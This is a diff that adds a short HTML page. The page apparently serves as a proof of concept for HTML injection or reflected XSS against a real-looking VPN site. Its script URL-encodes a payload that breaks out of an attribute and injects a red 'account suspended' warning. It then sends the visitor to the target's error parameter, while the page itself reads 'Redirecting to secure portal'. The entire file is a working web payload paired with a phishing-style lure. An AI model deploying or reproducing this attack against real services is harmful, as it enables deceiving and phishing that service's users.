@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+      // Inject your payload here
+      const payload = encodeURIComponent(
+        `"><div style='color:red;font-weight:bold'>Your account has been suspended due to suspicious activity.</div>`
+      );
+
+      // Target URL with payload
+      const target = `https://vpn.mobilevikings.be/?error=${payload}`;
+
+      // Redirect to it
+      location.href = target;
+    </script>
+  </head>
+  <body>
+    <p>Redirecting to secure portal...</p>
+  </body>
+</html>
